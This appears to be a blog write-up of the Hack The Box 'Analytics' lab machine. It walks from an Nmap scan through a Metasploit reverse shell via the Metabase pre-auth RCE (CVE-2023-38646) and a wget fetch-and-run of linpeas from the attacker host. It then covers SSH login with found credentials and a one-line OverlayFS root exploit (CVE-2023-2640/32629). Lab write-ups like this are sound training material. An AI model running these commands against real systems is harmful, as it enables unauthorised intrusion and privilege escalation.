---
title: Hack The Box - Analytics
date: 2024-07-02 13:33:37 +0200
categories:
  - HackTheBox
tags:
  - HTB
comments: true
---

HTB Analytics Machine - https://www.hackthebox.com/machines/analytics


### Scanning & Enumeration
Scan the machine with Nmap tool
```
nmap -sC -sV 10.10.11.233
```

![](/assets/img/posts/Pasted%20image%2020260820100731.png)

We will navigate to port 80, and while viewing the page source, a subdomain, **data.analytical.htb** , was found where a login page had been hosted

![](/assets/img/posts/Pasted%20image%2020260820100904.png)

So add it to our `/etc/hosts` file
	`10.10.11.233 analytical.htb data.analytical.htb`

While navigating to the subdomain, a webpage hosting a login form of Metabase, searching in google for: `Metabase vulnerability POC`

![](/assets/img/posts/Pasted%20image%2020260820101343.png)

### Exploitation & Gaining Access
It was discovered that it was vulnerable to CVE-2023-38646: https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/ and the Metasploit have a module for this vulnerability
```
msfconsole
search metabase
use exploit/linux/http/metabase_setup_token_rce
show option
set RHOST data.analytical.htb
set RPORT 80
set LHOST 10.10.16.27
run
```

After running the payload, we got a shell

![](/assets/img/posts/Pasted%20image%2020260820101510.png)

### Privilege Escalation
Lets use `linpeas` script, to find interesting things: https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS , so download it from our kali

First, from our kali
```
python3 -m http.server 80
```

Second, from the HTB machine
```
cd /home/metabase
wget <http://10.10.16.27/linpeas.sh>
chmod +x linpeas.sh
./linpeas.sh
```

After analyzing the results of `linpeas` script, a plain text of username and password were discovered
`META_PASS=An4lytics_ds20223#
`META_USER=metalytics`

![](/assets/img/posts/Pasted image 20250817003116.png)
``
Lets log-in via SSH
```
ssh metalytics@10.10.11.233
Password: An4lytics_ds20223#

cat user.txt                   # 50a6c93abfd7c2293045a2980ebc6617
```

While reviewing the results of `linpeas` again, it was discovered that the machine's version was Ubuntu 22.04.3

![](/assets/img/posts/Pasted image 20250817003157.png)

After extensive searching on Google, it was determined that the machine's version was susceptible to:
CVE-2023-2640 and CVE-2023-32629 : https://www.crowdstrike.com/blog/crowdstrike-discovers-new-container-exploit/

Executing the code
```
unshare -rm sh -c "mkdir 1 u w m && cp /u*/b*/p*3 1/; setcap cap_setuid+eip 1/python3;mount -t overlay overlay -o rw,lowerdir=1,upperdir=u,workdir=w, m && touch m/*;" && u/python3 -c 'import pty; import os;os.setuid(0); pty.spawn("/bin/bash")'
```

![1059](Pasted%20image%2020260820103105.png)

Searching for the root flag
```
root@analytics:~# cd /root
cat root.txt                 # 3e60c3f42dca352a5990682c2f73579f
```
